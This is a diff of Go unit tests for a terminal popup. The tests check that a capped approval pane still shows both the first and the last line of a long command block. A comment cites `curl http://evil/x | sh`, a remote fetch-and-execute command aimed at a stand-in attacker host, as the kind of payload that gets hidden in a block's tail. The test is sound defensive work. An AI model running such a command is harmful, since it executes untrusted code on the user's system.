@@ -451,10 +451,17 @@ func TestRenderPopupBodyHardBreaksLongToken(t *testing.T) {
 	}
 }
 
-// maxBodyRows caps the wrapped block: past the cap it keeps maxBodyRows−1 lines plus a faint
+// maxBodyRows caps the wrapped block: past the cap it keeps maxBodyRows−1 lines around a faint
 // "… (+N more lines)" marker (N = hidden lines) for exactly maxBodyRows body rows; a body at the cap
 // shows every line with no marker; a NEGATIVE cap shows everything. Zero is the separate case
 // below.
+//
+// WHICH lines survive is the security half of this test (elisionSplit): the head AND the block's
+// last line, the marker standing between them, wherever the budget can seat all three. A pane that
+// kept only the head could be approved off `npm test` while the line the human never saw was
+// `curl http://evil/x | sh` — the tail is where an appended payload lives, so the tail is the one
+// line the cap may not spend. Below three rows there is no head-and-tail to have: two rows keep the
+// FIRST line, which is the one that says what the block is, and one row is the marker alone.
 func TestRenderPopupBodyMaxRows(t *testing.T) {
 	th := newTheme(scheme.Default())
 	const width = 40
@@ -464,8 +471,20 @@ func TestRenderPopupBodyMaxRows(t *testing.T) {
 	if got := len(capped) - 2; got != 4 { // less the two borders
 		t.Fatalf("cap 4 rendered %d body rows, want 4:\n%s", got, strip(strings.Join(capped, "\n")))
 	}
-	if last := popupInterior(capped[len(capped)-2]); last != "… (+7 more lines)" {
-		t.Errorf("last body row = %q, want \"… (+7 more lines)\"", last)
+	wantRows := []string{"l0", "l1", "… (+7 more lines)", "l9"}
+	for i, want := range wantRows {
+		if got := popupInterior(capped[1+i]); got != want {
+			t.Errorf("body row %d = %q, want %q (head, marker, tail):\n%s", i, got, want, strip(strings.Join(capped, "\n")))
+		}
+	}
+
+	// Two rows cannot seat a head, a marker and a tail, so the head keeps the single content row.
+	twoRows := popupLines(renderPopup(th, popupSpec{body: tenLines, maxBodyRows: 2}, width))
+	if got := len(twoRows) - 2; got != 2 {
+		t.Fatalf("cap 2 rendered %d body rows, want 2:\n%s", got, strip(strings.Join(twoRows, "\n")))
+	}
+	if first, last := popupInterior(twoRows[1]), popupInterior(twoRows[2]); first != "l0" || last != "… (+9 more lines)" {
+		t.Errorf("cap 2 body rows = %q, %q, want \"l0\", \"… (+9 more lines)\"", first, last)
 	}
 
 	atCap := popupLines(renderPopup(th, popupSpec{body: "a\nb\nc\nd", maxBodyRows: 4}, width))
